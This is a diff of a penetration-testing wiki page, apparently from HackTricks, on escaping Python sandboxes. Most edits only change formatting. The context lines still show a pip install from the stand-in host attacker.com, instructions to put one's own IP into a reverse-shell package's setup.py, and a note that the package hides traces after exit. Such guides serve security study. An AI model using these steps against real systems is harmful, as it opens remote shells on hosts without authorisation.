@@ -2,7 +2,6 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-
 These are some tricks to bypass python sandbox protections and execute arbitrary commands.
 
 ## Command Execution Libraries
@@ -44,8 +43,7 @@ system('ls')
 
 Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
 
-> [!CAUTION]
-> **Python2 input()** function allows executing python code before the program crashes.
+> [!CAUTION] > **Python2 input()** function allows executing python code before the program crashes.
 
 Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
 
@@ -87,7 +85,9 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 
 You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
 > This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
@@ -1145,8 +1145,4 @@ will be bypassed
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {{#include ../../../banners/hacktricks-training.md}}
-
-
-
